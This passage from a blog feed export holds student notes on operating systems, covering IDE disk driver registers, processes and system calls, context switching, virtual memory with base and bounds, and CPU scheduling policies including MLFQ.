</ul>
</li>
</ol>
</li>
</ul>
<h3 id="File-System-Abstraction"><a href="#File-System-Abstraction" class="headerlink" title="File System Abstraction"></a>File System Abstraction</h3><ul>
<li><p>The abstraction excapsulate the specifics of device interaction which lets the OS can interact with different specific interfaces.</p>
<img src="https://p.ipic.vip/c4raa3.png" width="600px"/>
</li>
<li><p>Problems:</p>
<ul>
<li>If there is a device having many special undefined functions, then these functions will go unused in the generic interface layer</li>
<li>Over 70% of OS code is found in device drives<ul>
<li>it takes lots of times to drive the devices</li>
<li>those devices are the primary contributors to kernel crashes</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="Simple-IDE-Disk-Driver"><a href="#Simple-IDE-Disk-Driver" class="headerlink" title="Simple IDE Disk Driver"></a>Simple IDE Disk Driver</h2><h3 id="Registers"><a href="#Registers" class="headerlink" title="Registers"></a>Registers</h3><ol>
<li><p>Control Register</p>
<ul>
<li>Address <code>0x3F6 = 0X80 (0000 1RE0)</code>:<ul>
<li><code>R</code> &#x3D; reset</li>
<li><code>E = 0</code> means “enable interrupt”</li>
</ul>
</li>
</ul>
</li>
<li><p>Command Block Registers</p>
<ul>
<li>Address <code>0x1F0</code> &#x3D; Data Port</li>
<li>Address <code>0x1F1</code> &#x3D; Error</li>
<li>Address <code>0x1F2</code> &#x3D; Sector Count</li>
<li>Address <code>0x1F3</code> &#x3D; LBA low byte</li>
<li>Address <code>0x1F4</code> &#x3D; LBA mid byte</li>
<li>Address <code>0x1F5</code> &#x3D; LBA hi byte</li>
<li>Address <code>0x1F6 = 1B1D TOP4LBA</code> : B &#x3D; LBA, D &#x3D; drive</li>
<li>Address <code>0x1F7</code> &#x3D; Command &#x2F; Status</li>
</ul>
</li>
<li><p>Status Register (Address <code>0x1F7</code>):</p>
<ul>
<li><code>7</code> : <code>BUSY</code></li>
<li><code>6</code> : <code>READY</code></li>
<li><code>5</code> : <code>FAULT</code></li>
<li><code>4</code> : <code>SEEK</code></li>
<li><code>3</code> : <code>DRQ</code></li>
<li><code>2</code> : <code>CORR</code></li>
<li><code>1</code> : <code>IDDEX</code></li>
<li><code>0</code> : <code>ERROR</code></li>
</ul>
</li>
<li><p>Error Register (Address <code>0x1F1</code>)</p>
<ul>
<li><code>7</code> : <code>BBK</code> (Bad Block)</li>
<li><code>6</code> : <code>UNC</code> (Uncorrectable data error)</li>
<li><code>5</code> : <code>MC</code> (Media Changed)</li>
<li><code>4</code> : <code>IDNF</code> (ID mark Not Found)</li>
<li><code>3</code> : <code>MCR</code> (Media Change Requested)</li>
<li><code>2</code> : <code>ABRT</code> (Command aborted)</li>
<li><code>1</code> : <code>T0NF</code> (Track 0 Not Found)</li>
<li><code>0</code> : <code>AMNF</code> (Address Mark Not Found)</li>
</ul>
</li>
</ol>
<h3 id="Operations"><a href="#Operations" class="headerlink" title="Operations"></a>Operations</h3><ol>
<li><p>Wait for drive to be ready</p>
<ul>
<li>Read Status Register until drive is not busy and <code>READY</code>.</li>
</ul>
</li>
<li><p>Write parameters to command registers</p>
<ul>
<li>Wite the sector count, logical block address (LBA) of the sectors to be accessed, and drive number (<code>master=0x00</code> or <code>slave=0x10</code>, as IDE permits just two drives) to command registers (<code>0x1F2</code> - <code>0x1F6</code>).</li>
</ul>
</li>
<li><p>Start the I&#x2F;O</p>
<ul>
<li>Issuing read&#x2F; write to command register.</li>
<li>Write <code>READ—WRITE</code> command to command register (<code>0x1F7</code>).</li>
</ul>
</li>
<li><p>Data transfer (for writes)</p>
<ul>
<li>Wait until the drive status is <code>READY</code> and <code>DRQ</code>, write data to data port.</li>
</ul>
</li>
<li><p>Handle interrupts</p>
<ul>
<li>In the simplest case, handle an interrupt for each sector transferred.</li>
<li>More complex approaches allow batching.</li>
</ul>
</li>
<li><p>Handle errors</p>
<ul>
<li>After each operation, read the status register. If the <code>ERROR</code> bit is on, read the error register for details.</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Virtualizing CPU (Process)</title>
    <url>/myBlog/2022/10/27/2022/CSCI3150/2022-10-27-CSCI3150-Virtualizing-CPU-Process/</url>
    <content><![CDATA[<h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><ul>
<li>Process is a running program, which includes:<ol>
<li>Memory (address space)<ul>
<li>Instructions</li>
<li>Data sections</li>
</ul>
</li>
<li>Registers<ul>
<li>Program counter</li>
<li>Stack pointer</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Process-API"><a href="#Process-API" class="headerlink" title="Process API"></a>Process API</h3><ol>
<li><p><code>Create</code></p>
<ul>
<li>create a new process to run a program</li>
</ul>
</li>
<li><p><code>Destory</code></p>
<ul>
<li>halt a runaway process</li>
</ul>
</li>
<li><p><code>Wait</code></p>
<ul>
<li>wait for a process to stop running</li>
</ul>
</li>
<li><p><code>Miscellaneous Control</code></p>
<ul>
<li>some kind of method to suspend a process and then resume it (暫停然後恢復)</li>
</ul>
</li>
<li><p><code>Status</code></p>
<ul>
<li>get some status information about a process</li>
</ul>
</li>
</ol>
<h3 id="Process-Creation"><a href="#Process-Creation" class="headerlink" title="Process Creation"></a>Process Creation</h3><ol>
<li><p>Load a program code into <font color="F54747">memory</font>, then build up an <font color="F54747">address space</font> for the process.</p>
<ul>
<li>The OS performs the loading process lazily, it loads the pieces of code or data <font color="3A75EA">only when they are needed</font> during the program execution.</li>
</ul>
</li>
<li><p>Allocate the program’s run-time <font color="F54747">process stack</font> (store at the bottom of the address space)</p>
<ul>
<li><p>Used for <font color="3A75EA">local variables</font>, <font color="3A75EA">function parameters</font> and <font color="3A75EA">return address</font>.</p>
</li>
<li><p>Initialize the stack with arguments <code>argc</code> and the <code>argv</code> array of <code>main()</code> function.</p>
</li>
</ul>
</li>
<li><p>Create the program’s <font color="F54747">heap</font> (store at the position that after the coding)</p>
<ul>
<li>Used for <font color="3A75EA">requesting dynamically allocated data</font>.</li>
<li>Program requests such space by calling <code>malloc()</code> and free it by calling <code>free()</code>.</li>
</ul>
</li>
<li><p>Do the initialization tasks</p>
<ul>
<li>Input &#x2F; Output setup<ul>
<li>each process has three open file descriptors in default</li>
<li>standard input, output an error</li>
</ul>
</li>
</ul>
</li>
<li><p>Start the program running at the entry point (<code>main()</code>)</p>
</li>
</ol>
<img src="https://p.ipic.vip/h01f63.png" width="500px">



<h3 id="Process-Status"><a href="#Process-Status" class="headerlink" title="Process Status"></a>Process Status</h3><ol>
<li><p>Running</p>
<ul>
<li>A process is running on a processor.</li>
</ul>
</li>
<li><p>Ready</p>
<ul>
<li>A process is ready to run but for some reason the OS has chosen <font color="3A75EA">not to run it</font> at the moment.</li>
</ul>
</li>
<li><p>Blocked</p>
<ul>
<li>A process has performed some kind of operation.</li>
<li>When a process initiates an I&#x2F;O request to a disk, it becomes <font color="3A75EA">blocked</font> and thus some other process can use the processor.<img src="https://p.ipic.vip/n3v5i6.png" width="400px"></li>
</ul>
</li>
</ol>
<h3 id="Data-Structures"><a href="#Data-Structures" class="headerlink" title="Data Structures"></a>Data Structures</h3><ul>
<li>In the OS system, the key data structure<ol>
<li><p><strong>Process List</strong></p>
<ul>
<li>Current running process</li>
<li>Ready processes</li>
<li>Blocked processes</li>
</ul>
</li>
<li><p><strong>Register Context</strong></p>
<ul>
<li>the registers we need to run the process.</li>
</ul>
</li>
<li><p><strong>Process Control Block</strong></p>
<ul>
<li>For each process, there is an in-memory data structure that contains information about that process.</li>
</ul>
</li>
</ol>
</li>
</ul>
<h2 id="Execution-Mechanism"><a href="#Execution-Mechanism" class="headerlink" title="Execution Mechanism"></a>Execution Mechanism</h2><ul>
<li>The OS need to share the physical CPU by <font color="F54747">time sharing</font>,<br><font color="3A75EA">i.e., How we implement time sharing among multiple processes</font>.<ol>
<li><strong>Performance</strong>: How can we implement virtualization <font color="3A75EA">without add excessive overhead</font> to the system?</li>
<li><strong>Control</strong>: How can we run processes efficiently while <font color="3A75EA">retaining control</font> over the CPU?</li>
</ol>
</li>
</ul>
<h3 id="Direct-Execution"><a href="#Direct-Execution" class="headerlink" title="Direct Execution"></a>Direct Execution</h3><h4 id="Execution-Procedure"><a href="#Execution-Procedure" class="headerlink" title="Execution Procedure"></a>Execution Procedure</h4><img src="https://p.ipic.vip/so5ak6.png" width="500px">
<!-- | OS | Program |
| :--- | :--- |
| 1. Create entry for the process list | |
| 2. Allocate memory for the program | |
| 3. Load program into the memory | |
| 4. Set up stack with `argc` / `argv` | |
| 5. Clear registers | |
| 6. Execute call `main()` | |
| | 7. Run `main()` |
| | 8. Execute `return` from `main()` |
| 9. Free memory of process | |
| 10. Remove from process list | | -->


<h4 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h4><ul>
<li><p><strong>Problem</strong>: <font color="F54747"><strong>Restricted Operation</strong></font></p>
<ul>
<li>if a process wishes to perform some kind of restricted operation (受限的操作), such as,<ul>
<li>issung an I&#x2F;O request to a disk</li>
<li>gaining access to more system resources like CPU or memory</li>
</ul>
</li>
<li>The running program should be <font color="F54747">limited</font>, otherwise the OS would not be <font color="F54747">in control of anything</font> (it just becomes a library).</li>
<li>There should be something to isolate the applications and OS system, not allow the process touches the other processes’ address space.</li>
</ul>
</li>
<li><p><strong>Solution</strong>: </p>
<ul>
<li><p>Using protected control transfer to control users’ behaviors.</p>
<ol>
<li><p><font color="3A75EA"><strong>User Mode</strong></font>: Applications do not have full access to hardware resources.</p>
</li>
<li><p><font color="3A75EA"><strong>Kernel Mode</strong></font>: The OS has access to the full resources of the machine.</p>
</li>
</ol>
<ul>
<li>There are some privileged instructions</li>
<li>If users execute those privileged instructions under user mode, the system can limit the users’ behaviors.</li>
<li>Users can only execute those privileged instructions under kernel mode through system call.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="System-Call"><a href="#System-Call" class="headerlink" title="System Call"></a>System Call</h3><ul>
<li>Allow the users utilize the sysyem services through system calls.</li>
<li>It allows the kernel to <font color="F54747">carefully expose</font> certain <font color="3A75EA">key pieces of functionality</font> to user program, such as,<ul>
<li>accessing the file system</li>
<li>creating and destorying processes</li>
<li>communicating with other processes</li>
<li>allocating more memory</li>
</ul>
</li>
<li>Users can only call those system calls to get the services.</li>
</ul>
<ol>
<li><p><strong>Trap Instuction</strong></p>
<ul>
<li>switch from user mode to kernel mode (raise the privilege level to kernel mode).</li>
</ul>
</li>
<li><p><strong>Return-from-trap Instruction</strong></p>
<ul>
<li>return into the calling user program (reduce the privilege level to user mode).</li>
</ul>
</li>
</ol>
<h3 id="Limited-Direction-Execution"><a href="#Limited-Direction-Execution" class="headerlink" title="Limited Direction Execution"></a>Limited Direction Execution</h3><h4 id="Execution-Procedure-1"><a href="#Execution-Procedure-1" class="headerlink" title="Execution Procedure"></a>Execution Procedure</h4><img src="https://p.ipic.vip/0u1e9k.png" width="500px">

<h4 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h4><ul>
<li><strong>Problem</strong>: <font color="F54747"><strong>Switching between Processes</strong></font><ul>
<li>How can the OS <font color="F54747">regain control</font> (重新獲取控制權) of the CPU so that it can switch between the processes?</li>
</ul>
</li>
</ul>
<ol>
<li><p><font color="3A75EA"><strong>Cooperative Approach: Wait for system call</strong></font></p>
<ul>
<li>Processes periodically give up the CPU by making system calls, like <code>yield</code> (i.e., wait until the running process gives up the control).<ul>
<li>The OS decides to run other tasks.</li>
<li>Application also transfers control to the OS when they do something illegal, such as, divide by zero.</li>
</ul>
</li>
<li><font color="F54747">Problem: a process may get stuck in an infinite loop, if this happened, we need to reboot the machine.</font></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Non-cooperative Approach: The OS takes control</strong></font> through a <font color="F54747"><strong>timer interrupt</strong></font>.</p>
<ol>
<li><p>During the boot sequence, the OS starts the <font color="3A75EA">timer</font>.</p>
</li>
<li><p>The timer raises an interrupt every specific milliseconds.</p>
</li>
<li><p>When the interrupt is raised</p>
<ul>
<li>The currect running process is halted.</li>
<li>Save enough of the state of the program.</li>
<li>A pre-configured interrupt handler in the OS runs.</li>
</ul>
</li>
<li><p>After that, the <font color="3A75EA">scheduler</font> can make a decision:</p>
<ul>
<li>Continue running the current process or switch to different process.</li>
<li>If the decision is switch, the OS will execute <font color="F54747"><strong>Context switch</strong></font>.</li>
</ul>
</li>
</ol>
</li>
</ol>
<h3 id="Context-Switch"><a href="#Context-Switch" class="headerlink" title="Context Switch"></a>Context Switch</h3><ol>
<li><p><font color="3A75EA"><strong>Save the value of necessary registers</strong></font> for the current process onto its kernel stack.</p>
</li>
<li><p><font color="3A75EA"><strong>Restore the register values</strong></font> for the soon-to-be-executing process from its kernel stack.</p>
</li>
<li><p><font color="3A75EA"><strong>Switch to the kernel stack</strong></font> for the soon-to-be-executing process.</p>
</li>
</ol>
<ul>
<li>Examples: If we want to switch from process A to process B<ol>
<li>save the necessary registers of process A onto its kernel stack</li>
<li>restore the registers for process B from its kernel stack</li>
<li>switch to process B kernel stack</li>
</ol>
</li>
</ul>
<img src="https://p.ipic.vip/bis8ht.png" width="500px">
<img src="https://p.ipic.vip/wsk38g.png" width="500px">
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Virtualizing Memory (Address Space)</title>
    <url>/myBlog/2022/11/18/2022/CSCI3150/2022-11-18-CSCI3150-Virtualizing-Memory-Address-Space%20copy/</url>
    <content><![CDATA[<h2 id="Memory-Virtualization"><a href="#Memory-Virtualization" class="headerlink" title="Memory Virtualization"></a>Memory Virtualization</h2><ol>
<li><p>Introduction</p>
<ul>
<li>OS virtualizes its physical memory</li>
<li>OS provides an illusion memory space per each process</li>
</ul>
</li>
<li><p>Benefit</p>
<ol>
<li>Ease to use in programming</li>
<li>Memory efficiency in items of time and space</li>
<li>Isolate the processes and OS, protect from <font color="3A75EA">errant accesses</font> of other processes</li>
</ol>
</li>
<li><p>Multiprogramming and Time Sharing</p>
<ul>
<li><p>Load <font color="3A75EA">multiple processes</font> in memory</p>
<ol>
<li>execute one process for a while</li>
<li>switch processes between them in the memory</li>
</ol>
<ul>
<li>increase utilization and efficiency</li>
</ul>
</li>
<li><p>But it causes an important <font color="F54747">protection problem</font> as the errant memory accesses from other processes</p>
 <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h89c6pws46j30rk11uwju.jpg" width="300px"></li>
</ul>
</li>
</ol>
<h3 id="Address-Space"><a href="#Address-Space" class="headerlink" title="Address Space"></a>Address Space</h3><ul>
<li><p>OS creates an abstraction of physical memory</p>
<ul>
<li>The address space contains all about a running process  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ipm6a56uj30kg0veq6k.jpg" width="250px"></li>
</ul>
</li>
<li><p>Structure:</p>
<ol>
<li>Code: Instructions</li>
<li>Data: Global or static local variables</li>
<li>Heap: Dynamically allocate memory (<code>malloc</code>)</li>
<li>Stack: <ul>
<li>Store return address or values (parameters)</li>
<li>Contain local variables arguments to routines</li>
</ul>
</li>
</ol>
</li>
</ul>
<h3 id="Virtual-Address"><a href="#Virtual-Address" class="headerlink" title="Virtual Address"></a>Virtual Address</h3><ul>
<li>Every address in a running program is virtual (OS translates the virtual address to physical address)  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of code  : %p\n&quot;</span>, (<span class="type">void</span> *) main);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of heap  : %p\n&quot;</span>, (<span class="type">void</span> *) <span class="built_in">malloc</span>(<span class="number">1</span>));</span><br><span class="line">    <span class="type">int</span> x = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;location of stack : %p\n&quot;</span>, (<span class="type">void</span> *) &amp;x);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Outputs: Code &gt; Heap &gt;&gt; Stack</span></span><br><span class="line"><span class="comment">        location of code  : 0x102937ed8</span></span><br><span class="line"><span class="comment">        location of heap  : 0x132606810</span></span><br><span class="line"><span class="comment">        location of stack : 0x16d4cb42c</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Address-Transition"><a href="#Address-Transition" class="headerlink" title="Address Transition"></a>Address Transition</h2><ul>
<li><p>Relocation Address Space</p>
<ul>
<li>Every process has it own address space (start at address 0).</li>
<li>The OS wants to place the process somewhere else in physical memory, not at address 0.</li>
</ul>
<ol>
<li>Single Process</li>
</ol>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iqa3asucj31dd0u0dlw.jpg" width="500px">

<ol start="2">
<li>Multiple Processes<ul>
<li><font color="3A75EA">Base register</font>: store the location of the process in physical memory, so that it can easily address the memory by adding the base register.</li>
<li><font color="3A75EA">Bounds register</font>: remember the maximum length of address space.</li>
<li>It can prevent the process access the location out of the boundary.</li>
</ul>
</li>
</ol>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iq81env7j315b0u0wkj.jpg" width="400px"></li>
</ul>
<h3 id="Dynamic-Relocation"><a href="#Dynamic-Relocation" class="headerlink" title="Dynamic Relocation"></a>Dynamic Relocation</h3><ul>
<li>When a program starts running, the OS decides <font color="3A75EA">where</font> a process should be loaded <font color="3A75EA">in physical memory</font>.<ul>
<li><p>Set the base register a value<br>  $$ physical \thinspace address &#x3D; virtual \thinspace address + base $$</p>
</li>
<li><p>Every virtual address must <font color="F54747">not be negative or greater than bound</font><br>  $$ 0 \leq virtual \thinspace address &lt; bounds $$</p>
</li>
<li><p>Two ways of bounds register</p>
  <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8iqa3ww0aj31e50u0tf4.jpg" width="500px"></li>
</ul>
</li>
</ul>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><ol>
<li><p>Base</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ir7pmn5qj31am0iatb2.jpg" width="500px">
</li>
<li><p>Base + Bounds</p>
<img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8ir7r3ogbj31am0i6q5v.jpg" width="500px"></li>
</ol>
<h3 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h3><ul>
<li><p>The OS must take action to implement <font color="3A75EA">base-and-bounds</font> approach</p>
</li>
<li><p>Three critical junctures:</p>
<ol>
<li><p>When a process <font color="3A75EA">starts running</font>: Finding space for address space in physical memory.</p>
<ul>
<li><font color="F54747">free list</font>: a list of the range of the physical memory are <font color="F54747">not in use</font>. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfvowo3j31i00q842a.jpg" width="500px"></li>
</ul>
</li>
<li><p>When a process is <font color="3A75EA">terminated</font>: Reclaiming the memory for use.</p>
<ul>
<li>The OS must <font color="F54747">put the memory back</font> to the free list. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfu7fojj31i00n6dls.jpg" width="500px"></li>
</ul>
</li>
<li><p>When context <font color="3A75EA">switch occurs</font>: Saving and storing the base-and-bounds pair.</p>
<ul>
<li>The OS must <font color="F54747">save and restore</font> the base-and-bounds pair. <img src="https://tva1.sinaimg.cn/large/008vxvgGgy1h8irfshofsj31i00pctdi.jpg" width="500px"></li>
</ul>
</li>
</ol>
</li>
<li><p>Inefficiency</p>
<ol>
<li>Big chunk of free space</li>
<li>The free space takes up physical memory</li>
<li>Hard to run when an address space does not fit into the physical memory (e.g. 4KB space)</li>
</ol>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Virtualizing CPU (Scheduling)</title>
    <url>/myBlog/2022/11/04/2022/CSCI3150/2022-11-4-CSCI3150-Virtualizing-CPU-Scheduling/</url>
    <content><![CDATA[<h2 id="Scheduling"><a href="#Scheduling" class="headerlink" title="Scheduling"></a>Scheduling</h2><h3 id="Assumptions"><a href="#Assumptions" class="headerlink" title="Assumptions"></a>Assumptions</h3><ol>
<li>Each job runs for <font color="3A75EA">same among of time</font>.</li>
<li>All jobs <font color="3A75EA">arrive at the same time</font>.</li>
<li>All jobs only use the <font color="3A75EA">CPU</font> (i.e., no I&#x2F;O operations).</li>
<li>The <font color="3A75EA">running time</font> of each job is known.</li>
</ol>
<h3 id="Scheduling-Metrics"><a href="#Scheduling-Metrics" class="headerlink" title="Scheduling Metrics"></a>Scheduling Metrics</h3><ol>
<li><p>Performance Metric: <font color="F54747"><strong>Turnaround Time</strong> (往返時間)</font></p>
<ul>
<li>The time at which <font color="3A75EA">the job completes</font> minus the time at which <font color="3A75EA">the job arrived</font> in the system.<br> $$T_{turnaround} &#x3D; T_{completion} - T_{arrival}$$</li>
</ul>
</li>
<li><p>Another Metric: <font color="F54747"><strong>Fairness</strong></font></p>
</li>
<li><p>New Metric: <font color="F54747"><strong>Response Time</strong></font></p>
<ul>
<li>The time from <font color="3A75EA">when the job arrives</font> to the <font color="3A75EA">first time it is scheduled</font>.<br> $$T_{response} &#x3D; T_{firstrun} - T_{arrival}$$</li>
</ul>
</li>
</ol>
<h2 id="Scheduling-Strategies"><a href="#Scheduling-Strategies" class="headerlink" title="Scheduling Strategies"></a>Scheduling Strategies</h2><h3 id="Simple-Strategies"><a href="#Simple-Strategies" class="headerlink" title="Simple Strategies"></a>Simple Strategies</h3><h4 id="First-In-First-Out-FIFO"><a href="#First-In-First-Out-FIFO" class="headerlink" title="First In First Out (FIFO)"></a><font color="F54747">First In First Out (FIFO)</font></h4><ul>
<li><p>a simple and easy to implement strategy.</p>
</li>
<li><p>Example:</p>
<ul>
<li>A arrived just before B which also arrived just before C.</li>
<li>Each job runs for 10 seconds.  <img src="https://p.ipic.vip/es9yk7.png" width="400px">
  $$T_{average\,turnaround} = \frac{10 + 20 + 30}{3} = 20s$$</li>
</ul>
</li>
<li><p>Problem: </p>
<ul>
<li>If we <font color="3A75EA">relax the assumption 1 (Each job runs for same among of time)</font>:<ul>
<li>A runs for 100 seconds, B and C run for 10 seconds each.  <img src="https://p.ipic.vip/yttjpe.png" width="400px">
  $$T_{average\,turnaround} = \frac{100 + 110 + 120}{3} = 110s$$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Shortest-Job-First-SJF"><a href="#Shortest-Job-First-SJF" class="headerlink" title="Shortest Job First (SJF)"></a><font color="F54747">Shortest Job First (SJF)</font></h4><ul>
<li><p>run the shortest job first, then the next shortest, and so on.</p>
</li>
<li><p>Example:</p>
<ul>
<li>A arrived just before B which also arrived just before C.</li>
<li>A runs for 100 seconds, B and C run for 10 seconds each.  <img src="https://p.ipic.vip/avf7iy.png" width="400px">
  $$T_{average\,turnaround} = \frac{10 + 20 + 120}{3} = 50s$$</li>
</ul>
</li>
<li><p>Problem: </p>
<ul>
<li>If we <font color="3A75EA">relax the assumption 2 (All jobs arrive at the same time)</font>:<ul>
<li>A arrives at t &#x3D; 0, B and C arrive at t &#x3D; 10.  <img src="https://p.ipic.vip/baycel.png" width="400px">
  $$T_{average\,turnaround} = \frac{100 + (110 - 10) + (120 - 10)}{3} = 103.3s$$</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="Shortest-Time-to-Completion-First-STCF"><a href="#Shortest-Time-to-Completion-First-STCF" class="headerlink" title="Shortest Time-to-Completion First (STCF)"></a>Shortest Time-to-Completion First (STCF)</h4><ul>
<li><p>Add a preemption to SJF, when a new job enters the system:</p>
<ol>
<li>Determine the remaining jobs and new job</li>
<li>Schedule the job which has the least time left</li>
</ol>
</li>
<li><p>Example:</p>
<ul>
<li>A arrives at t &#x3D; 0 and needs to run for 100 seconds.</li>
<li>B and C arrive at t &#x3D; 10 and need to run for 10 seconds.  <img src="https://p.ipic.vip/16zklv.png" width="400px">
  $$T_{average\,turnaround} = \frac{(120 - 0) + (20 - 10) + (30 - 10)}{3} = 50s$$</li>
</ul>
</li>
</ul>
<h4 id="Round-Robin-RR"><a href="#Round-Robin-RR" class="headerlink" title="Round Robin (RR)"></a>Round Robin (RR)</h4><ul>
<li><p>Run a job for a <font color="3A75EA">time slice</font>, and switch to the next job in the <font color="3A75EA">run queue</font> until the jobs are finished.</p>
</li>
<li><p>The length of the time slice must be a <font color="F54747">multiple of the timer-interrupt period</font>.</p>
</li>
<li><p><font color="F54747">Noted</font>: RR is fair, but performs poorly on performance metrics like turnaround time.</p>
</li>
<li><p>Example:</p>
<ul>
<li><p>A, B and C arrive at the same time and each of them run for 5 seconds.</p>
</li>
<li><p>In SJF:</p>
  <img src="https://p.ipic.vip/bkq1aw.png" width="400px">
  $$T_{average\,response} = \frac{0 + 5 + 10}{3} = 5s$$

</li>
<li><p>In RR:</p>
  <img src="https://p.ipic.vip/nx41d7.png" width="400px">
  $$T_{average\,response} = \frac{1 + 1 + 1}{3} = 1s$$</li>
</ul>
</li>
<li><p>Length of time slice</p>
<ul>
<li><p><font color="3A75EA">Shorter time slice</font></p>
<ul>
<li>Better response time.</li>
<li>The cost of context switching will dominate the overall performance.</li>
</ul>
</li>
<li><p><font color="3A75EA">Longer time slice</font></p>
<ul>
<li>Worse response time.</li>
<li>Reduce the cost of switching.</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>Incorporating I&#x2F;O</strong></p>
<ul>
<li><p>Relax the assumption 3 (All jobs only use the CPU).</p>
</li>
<li><p>When a job initiates an I&#x2F;O request:</p>
<ol>
<li>The job is blocked until the I&#x2F;O request completed.</li>
<li>The scheduler should schedule another job on the CPU.</li>
</ol>
</li>
<li><p>When the I&#x2F;O completes,</p>
<ol>
<li>An interrupt is raised.</li>
<li>The OS moves the process from the blocked state back to the ready state.</li>
</ol>
</li>
<li><p>Example:</p>
<ul>
<li>A and B need 50ms of CPU time each.</li>
<li>In every 10ms, A issues an I&#x2F;O request (takes 10ms).</li>
<li>B simply uses the CPU for 50ms and performs no I&#x2F;O request.</li>
<li>The scheduler runs A first.      <img src="https://p.ipic.vip/5yn1jh.png" width="500px"></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Multi-Level-Feedback-Queue"><a href="#Multi-Level-Feedback-Queue" class="headerlink" title="Multi-Level Feedback Queue"></a>Multi-Level Feedback Queue</h3><h4 id="Basic-Rules"><a href="#Basic-Rules" class="headerlink" title="Basic Rules"></a>Basic Rules</h4><ol>
<li><p>MLFQ has a number of distinct <font color="3A75EA">queues</font></p>
<ul>
<li>each queue is assigned a different priority level (優先次序).</li>
</ul>
</li>
<li><p>A job that is ready to run is on a <font color="3A75EA">signle queue</font></p>
<ul>
<li>a job on a <font color="F54747">higher priority</font> is chosen to run.</li>
<li>use round-robin scheduling among jobs in the same queue.</li>
<li>Rule 1: <font color="F54747">If Priority(A) &gt; Priority(B), A runs</font></li>
<li>Rule 2: <font color="F54747">If Priority(A) &#x3D; Priority(B), A and B run in RR</font></li>
</ul>
</li>
</ol>
<ul>
<li>Example:  <img src="https://p.ipic.vip/btp5ge.png" width="300px"></li>
</ul>
<h4 id="Change-Priority"><a href="#Change-Priority" class="headerlink" title="Change Priority"></a>Change Priority</h4><ul>
<li>MLFQ varies the priority of a job based on its observed behavior.</li>
<li>MLFQ priority adjustment algorithm:<ul>
<li>Rule 3: <font color="F54747">When a job enters the system, it is placed at the highest priority</font></li>
<li>Rule 4a: <font color="F54747">If a job uses up an entire time slice while running, its priority will be reduced</font></li>
<li>Rule 4b: <font color="F54747">If a job gives up the CPU before the time slice is up (e.g., I&#x2F;O request), it stays at the same priority level</font></li>
</ul>
</li>
</ul>
<h4 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h4><ol>
<li><p><font color="3A75EA">Single</font> Long-Running Job</p>
<ul>
<li>A three-queue scheduler with time slice 10ms. <img src="https://p.ipic.vip/vor93v.png" width="350px"></li>
<li>According to rule 4a, its priority will be reduce after one time slice.</li>
</ul>
</li>
<li><p>Along Came a Short Job</p>
<ul>
<li>Job A: a long-running CPU-intensive job</li>
<li>Job B: a short-running interactive job, and arrives at time T &#x3D; 100 <img src="https://p.ipic.vip/r9pitc.png" width="350px"></li>
<li>According to rule 3, when a new job enters the system, it is placed at the highest priority.</li>
</ul>
</li>
<li><p>I&#x2F;O Request</p>
<ul>
<li>Job A: a long-running CPU-intensive job</li>
<li>Job B: an intensive job that need the CPU only for 1ms before performing an I&#x2F;O request <img src="https://p.ipic.vip/8t6xdj.png" width="350px"></li>
<li>According to rule 4b, MLFQ approach keeps an interactive job at the highest priority.</li>
</ul>
</li>
</ol>
<h4 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h4><ol>
<li><p>Starvation</p>
<ul>
<li>If there are many interactive jobs in the system, the long-running jobs will never receive any CPU time.</li>
</ul>
</li>
<li><p>Game the schedule</p>
<ul>
<li>After running 99% of a time slice, issue an I&#x2F;O operation, and the job can gain a higher percentage of CPU time.</li>
<li>i.e., A job will give up the CPU when it almost reach the time slice, so that it can keep the high priority.</li>
</ul>
</li>
<li><p>A program may change its behavior over time</p>
<ul>
<li>i.e., CPU bound process → I&#x2F;O bound process</li>
</ul>
</li>
</ol>
